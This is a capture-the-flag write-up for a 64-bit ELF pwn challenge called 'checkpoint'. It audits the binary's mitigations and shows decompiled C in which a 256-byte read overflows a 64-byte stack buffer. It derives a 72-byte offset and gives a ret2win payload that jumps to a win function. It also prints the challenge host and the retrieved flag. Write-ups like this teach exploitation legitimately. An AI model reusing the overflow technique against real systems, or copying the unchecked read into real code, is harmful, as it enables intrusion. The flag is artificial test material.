---
challenge: checkpoint
category: pwn
techniques: [stack-buffer-overflow, ret2win]
time_to_flag: 2
status: solved
---

# Sparrow Freight Checkpoint — Stack Buffer Overflow ret2win Writeup

## 1. Challenge Overview
- **Binary:** `checkpoint` (64-bit ELF, x86-64, dynamically linked)
- **Target OS:** Ubuntu 24.04 LTS (`glibc 2.39`)
- **Remote Host:** `nc pwn.h7tex.com 43055`
- **Provided Files:**
  - `checkpoint`: Challenge binary
  - `libc.so.6`: Target system C library
  - `ld-linux-x86-64.so.2`: Matching dynamic loader
  - `README.txt`: Environment information

## 2. Binary Mitigation Audit (checksec)
- **Arch:** x86-64 Little Endian (`ET_EXEC`)
- **PIE:** Disabled (static code addresses at base `0x400000`, entry `0x401130`)
- **Stack Canary:** Disabled in `checkpoint()`
- **NX:** Enabled
- **RELRO:** Partial RELRO

## 3. Vulnerability Analysis
- In `checkpoint()` (`0x4012a4`):
  ```c
  void checkpoint() {
      char buf[64];
      puts("=== Sparrow Freight border checkpoint ===");
      puts("State your name for the log: ");
      read(0, buf, 0x100); // 256 bytes read into a 64-byte stack buffer!
      printf("Access denied, %s. Turn back.\n", buf);
  }
  ```
- **Overflow Offset:**
  - Stack allocation: `sub rsp, 0x40` (64 bytes).
  - Saved RBP: 8 bytes.
  - Return address offset: $64 + 8 = 72$ bytes.
  - Overflow capacity: $256 - 72 = 184$ bytes.

## 4. Built-in Win Function (`grant_access`)
- A dedicated win routine `grant_access()` exists at static address `0x401216`:
  ```c
  void grant_access() {
      char flag[80];
      FILE *f = fopen("/flag", "r");
      if (!f) { puts("[!] flag file missing"); return; }
      fgets(flag, sizeof(flag), f);
      fclose(f);
      printf("ACCESS GRANTED: %s\n", flag);
      fflush(stdout);
  }
  ```

## 5. Exploitation Strategy
Because PIE is disabled, we directly hijack the return address of `checkpoint()` to `grant_access()` (`0x401216`):
$$\text{Payload} = \text{"A"} \times 72 + \text{p64}(0\text{x}401216)$$

When `checkpoint()` returns, execution transfers directly to `grant_access()`, which opens `/flag` and prints the stamp.

## 6. Retrieved Flag
```text
H7CTF{0b3091f1-ac51-4433-8288-808b378c20f7}
```
